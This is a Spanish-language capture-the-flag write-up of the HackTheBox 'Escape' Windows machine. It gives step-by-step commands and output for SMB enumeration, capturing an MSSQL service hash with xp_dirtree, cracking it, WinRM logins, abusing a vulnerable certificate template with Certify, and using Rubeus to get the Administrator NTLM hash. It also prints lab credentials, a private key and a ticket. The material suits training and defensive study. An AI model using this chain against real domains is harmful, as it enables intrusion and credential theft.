---
layout: post
title : "Escape - HackTheBox"
author : elc4br4
image : /assets/images/HTB/Escape-HackTheBox/Escape.jpg
optimized_image : /assets/images/HTB/Escape-HackTheBox/Escape.jpg
tags : [ Windows, HackTheBox ]
description : 📡En esta ocasión estoy ante una máquina Windows nivel `Medium` de la plataforma HackThebox que me ha parecido muy interesante y con la que se aprenden técnicas nuevas📡.
---

📡En esta ocasión estoy ante una máquina Windows nivel `Medium` de la plataforma HackThebox que me ha parecido muy interesante y con la que se aprenden técnicas nuevas📡.

![](/assets/images/HTB/Escape-HackTheBox/Escape2.webp)

![](/assets/images/HTB/Escape-HackTheBox/escape-rating.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
3. [Escalada de Privilegios](#privesc). 

     
# Reconocimiento [#](reconocimiento) {#reconocimiento}

Comenzamos lanzando nmap como de costumbre para encontrar puertos abiertos en la máquina víctima.

```ruby
❯ nmap -p- -Pn -n --min-rate 5000 10.10.11.202 -oG puertos_escape
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-02 19:10 CET
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE SERVICE
53/tcp  open  domain
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Podemos ver que tenemos 4 puertos abiertos, los siguientes...

Pero antes de nada procedo a lanzar otro escaneo de nmap para que me arroje más detalles sobre estos puertos, lanzando una serie de scripts básicos de nmap y detectando las versiones y los servicios que corren en cada puerto.

Esto lo hago con el siguiente comando

```bash
nmap -p53,135,139,445 -Pn -n -sCV 10.10.11.202 -oN servicios
```

![](/assets/images/HTB/Escape-HackTheBox/uno.webp)

Tenemos estos puertos abiertos, y en ellos corren estos servicios.

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 53     | dns      | Simple DNS Plus |
| 135    | msrpc    | Microsoft Windows RPC |
| 139    | netbios-ssn| Microsoft Windows netbios-ssn |
| 445    | microsoft-ds| SMB |

Comenzaré enumerando un poco el Samba.

Voy a enumerar recursos compartidos de la máquina, esto lo haré con la herramienta SMBMAP.

Empleando una null sesión utilizando un usuario al azar podemos enumerar los recursos compartidos existentes y a cuales tenemos acceso.

![](/assets/images/HTB/Escape-HackTheBox/2.webp)

Tenemos acceso a los recursos IPC$ y a Public.

Consigo acceder a IPC$ pero no tengo permisos para listar archivos en su interior por lo que solo me queda acceder al recurso Public.

![](/assets/images/HTB/Escape-HackTheBox/3.webp)

Al acceder veo un pdf que me descargo y abro para ver su contenido.

![](/assets/images/HTB/Escape-HackTheBox/4.webp)

![](/assets/images/HTB/Escape-HackTheBox/5.webp)

Básicamente nos explica como acceder a la base de datos SQL, nos da unas credenciales y nos avisa de que debemos utilizar la autenticación de Windows.

> PublicUser:GuestUserCantWrite1

Y además de eso veo un par de nombres que podrían ser usuarios existentes --> Ryan, Tom, Brandon.

> También tenemos el dominio sequel.htb

Como tenemos posibles credenciales para conectarnos accedo a la base de datos usando `mssqlclient.py`.

```powershell
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```

![](/assets/images/HTB/Escape-HackTheBox/6.webp)

# Explotación [#](explotación) {#explotación}

Intento usar xp_cmdshell para intentar ejecutar comandos en el sistema y conseguir ganar acceso a través de una reverse shell pero no me deja.

```sql
SQL> xp_cmdshell whomai
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

Tras buscar información encontré un artículo que podría servirme.

(https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)[https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478]

Este artículo muestra como ejecutando un pequeño comando en la base de datos podemos conseguir el hash netntlmv2 del usuario que gestiona la base de datos, es muy sencillo.

```bash
EXEC master.sys.xp_dirtree '\\10.10.11.202\Public',1, 1
```

Y a su vez con `smbserver.py` capturamos el hash.

```bash
sudo impacket-smbserver $(pwd) filetransfer -smb2support
```

![](/assets/images/HTB/Escape-HackTheBox/7.webp)

![](/assets/images/HTB/Escape-HackTheBox/8.webp)

Tras obtener el hash me lo copio en un archivo y lo craqueo usando John The Ripper.

![](/assets/images/HTB/Escape-HackTheBox/9.webp)

Consigo craquear el hash del usuario sql_svc y las contraseña es REGGIE1234ronnie

Al tener credenciales válidas intento conectarme a la máquina a través de WinRM usando la herramienta evil-winrm.

```bash
ruby evil-winrm.rb -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```

Tras desplazarme por los directorios encuentro el usuario Ryan.Cooper, por lo que supongo que el siguiente paso es migrarme a este usuario.

![](/assets/images/HTB/Escape-HackTheBox/10.webp)

Enumerando un poco encuentro el directorio donde se almacena toda la información relacionada con el servicio SQL y veo que hay una carpeta llamada Logs donde podría haber algo de interés, por lo que accedo al mismo y encuentro esta información.

![](/assets/images/HTB/Escape-HackTheBox/11.webp)

Ahí podemos ver credenciales del usuario `Ryan.Cooper:NuclearMosquito3`, por lo que trato de acceder con estas credenciales a la máquina a través de evil-winrm como anteriormente.

```bash
ruby evil-winrm.rb -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```

![](/assets/images/HTB/Escape-HackTheBox/12.webp)

# Escalada de Privilegios [#](privesc) {#privesc}

Ahora ya toca migrar al usuario administrador, es decir, toca escalar privilegios.

Para escalar privilegios subo el archivo Certify.exe ya compilado para buscar plantillas de certificados vulnerables.	

Lo lanzo con el siguiente comando y me arroja toda la información.

```ruby
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ./certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```


Tras obtener esta información debemos lanzar de nuevo la herramienta certify.exe para obtener el certificado del usuario Administrador y obtenemos su clave privada, esto lo haremos con los datos que obtuvimos antes con la plantilla vulnerable.

```ruby
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 24

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0iIsK5UMjkMqzMh6IpbcJR18qpfJ+JK/n2qOagV4DvgcRKJ/
WSwGCuOazuapnXq+fZM6oBpU9d2B9y8maBI9KrWHny/1BKf51YN/piDn0r57Yw6M
dRj0rdFD6VDYwMtU4xFZ+X6qpMT/omxNYOwAuqfzWX3HWOBPaLZaN2PJNT+2XNdG
IDdQPfTxNENH+AKQeP0hfLLw0QWzr3Z6NqbbuMDacP6hZ/Tfl5woiVmKv28/ySnA
vC/UVo19xS/iupjwIJZj8z86CKj6AndFBPOolveSsze4NZAEtK1HKrMrvNwjZXRZ
kFFMLrJ7E5af/3wVQ1246OjaQ9kpohh6VqMaCQIDAQABAoIBAQCT0/iQ/H1lw7jj
chICLXFYJwNiHAC5f7uREex4h7prhX6Vhl/iwsbJeE+bSMiAgi5qt13h7kRg52Ec
HS5+vn4LgsOTaLCNgwKOg8EUhUexidHR4RVM966CbZrCE9842pKwX6+VhtfTrMdO
Y7SX/8+PgMIA7iyEyOD0gHy9RNTzQMTbsqcy4dOmg/TvDwtZXe2r/3K4LbEjmo+6
HmH1gtbxPX7m+1ukuDTWPWuDRLZQZLeXxgBVVHc9vByn91kGguR3gGXkg7YOKiKr
up2Owi1l5xGySeQnFUpfMAyMGgW3K8uXDr3c9Ej8nml+OxI/szv0oQJ3ezzz3jQw
4rOOpqGlAoGBAPrMDvBJTiPhYKM0wkAAxRQHiyQ2Dj3Dp7BuA1d6mUmKinVR5f5E
bYsbBCdVlV2BRUN8NCWZ8UkeE0kq5ongxz0pbwt6j0O4WOKpB8jldXAHq57nnjVf
Oh6UEalHvf/px/jHvA4rXpNkw1FaU9RsbRFkxPG6XYgb7bRITtOvHS4LAoGBANZ+
KA/NY1k2kwfY3psZr8YdXMkoA2QG2xOMcRjzm3mPYpY/aoinGNNmENAQXhtNTjz5
Ut2scVMAACAGRySL82LwpCz5Kg82RqLaKf+tZp8rmSKI3a1dQ/NZ0xJLdum1lh0s
mJndU5HSU9R4zzX3zo673DrVP/cG6iGKR1X9mmi7AoGAN6wclNJw+h4JqbEIfdSt
6uhRxtQJDUTlcJC7RSv94wlR+wEXIP5nor14ipLA+WS8z2I+4SnvGeAHP/K6AllX
YQhVkiK+srW1ZXtIMxxcmWXafwfDYu2kpS0RTpaSYsCul1cfM7YE5Is1oFWAzmLT
Q00vOsm4AYLRnXd/qBXzUEkCgYEAvVCUI35wlalplJ+Buvus/PuljZZXh83VRyfK
Gu/I5j38EgjfCsYRT2TiqgIITaipyX91+FnfnBaABcQEvukXZNhoz5kL2mlZZxuP
vi9aSFq+ypBquD19YCiD973LsvOnDxDxj7ydqjMt8na+zS9vjOOaugLGdk4QEJJv
7CHuS0kCgYBptYpDw8/yQ0z0nG3PjnmwfvH8JGqzKB+O+xAPPdDpK6+0v8/tPn7I
E/rVDbxtY4ENNk4vRx/GEk5FNLYb+NR590e+I5iPWc8tlJd7/u4S7yBhLp/BX1mH
RArrtaotO3CoAG1RnmTp/LMqqN37TEeEj9qjq8hMrir/s4e1S1FreA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIF6DCCBNCgAwIBAgITHgAAABg9/MYiepkuJwAAAAAAGDANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMzAzMDMzOTEzWhcNMjUwMzAz
MDM0OTEzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDSIiwrlQyOQyrMyHoiltwlHXyq
l8n4kr+fao5qBXgO+BxEon9ZLAYK45rO5qmder59kzqgGlT13YH3LyZoEj0qtYef
L/UEp/nVg3+mIOfSvntjDox1GPSt0UPpUNjAy1TjEVn5fqqkxP+ibE1g7AC6p/NZ
fcdY4E9otlo3Y8k1P7Zc10YgN1A99PE0Q0f4ApB4/SF8svDRBbOvdno2ptu4wNpw
/qFn9N+XnCiJWYq/bz/JKcC8L9RWjX3FL+K6mPAglmPzPzoIqPoCd0UE86iW95Kz
N7g1kAS0rUcqsyu83CNldFmQUUwusnsTlp//fBVDXbjo6NpD2SmiGHpWoxoJAgMB
AAGjggLCMIICvjA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFGVOmxmq36mdL4JDRVowemNHqJ/W
MB8GA1UdIwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8Egbwwgbkw
gbaggbOggbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAs
Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
dXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxp
c3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYB
BQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMt
Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
LENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRl
P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG
9w0BAQsFAAOCAQEAON/PsHxpJpc4H0RLJhv7/E66GIEeP7yxnQ3si2fUniJ7TD1f
gu/x5VHmTesCGh2h6zY5S7szGwzlZ+1LPWCx+un+Wna53NMH7A+7GLJWSdjWgZEt
1c/D7lEG9xa39UiM3+S+feLAhGBVgtNKff6cMtKhUlpQO+AVow21UiW5DIioEYSH
GDP1Gl0J34MxnPU78TDV0E46Xc1fXfiENiKTRRveaWAHVH8xqDR1q98yt9QaBCjU
hlLVoFeT3Ipg+9Zf22+mDvcSdP5vB+hdZUxlQgmPPzPcKnX+Xm8EU/17NpITkIR1
v23UVfEv3DAqZPrBuQD2bZ8qhrcbfFb1bCt71Q==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Obtenemos la clave privada y el certificado que debemos copiarnos a un archivo para posteriormente convertirlo de .pem a .pfx usando este comando.

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![](/assets/images/HTB/Escape-HackTheBox/13.webp)

Una vez convertido usaremos `rubeus.exe`, que debemos subir a la máquina junto al `certificado.pfx` para obtener el hash NTLM para poder conectarnos con evil-winrm como administrador.

```powershell
./rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```

```ruby
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::a947:6718:ea49:512e%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  3/2/2023 7:56:10 PM
  EndTime                  :  3/3/2023 5:56:10 AM
  RenewTill                :  3/9/2023 7:56:10 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  11MbvUjP0nSkxSOrYsM+nA==
  ASREP (key)              :  46C25F427523D3611F7533B287E88287

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

En la última línea podemos encontrar el hash NTLM que debemos copiarnos para conectarnos como usuario Admnistrador y poder leer la flag de root.txt

![](/assets/images/HTB/Escape-HackTheBox/14.webp)